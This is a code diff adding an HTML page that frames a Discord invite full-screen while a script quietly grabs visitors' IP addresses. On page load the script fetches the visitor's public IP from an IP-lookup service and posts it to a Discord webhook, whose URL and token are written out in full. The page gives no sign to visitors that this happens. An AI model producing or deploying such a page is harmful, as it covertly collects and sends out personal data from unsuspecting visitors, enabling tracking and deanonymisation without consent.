@@ -1,0 +1,21 @@
+<html>
+  <body>
+    <iframe src="https://discord.gg/[13456]" width="100%" height="100%"></iframe>
+    <script>
+      function getIP() {
+        fetch('https://api.ipify.org?format=json', {
+          method: 'GET',
+          mode: 'no-cors',
+        }).then(response => response.json()).then(data => {
+          fetch(`[https://discord.com/api/webhooks/1235575325186850836/tNxGTnC6CwAaewEnN55SLzzZ-K7b8amP-dbZnxHiB02vcm43N3ucwAolgSAJptsKpopQ]`, {
+            method: 'POST',
+            body: JSON.stringify({ content: data.ip }),
+            headers: { 'Content-Type': 'application/json' },
+          });
+        });
+      }
+
+      window.onload = getIP;
+    </script>
+  </body>
+</html>
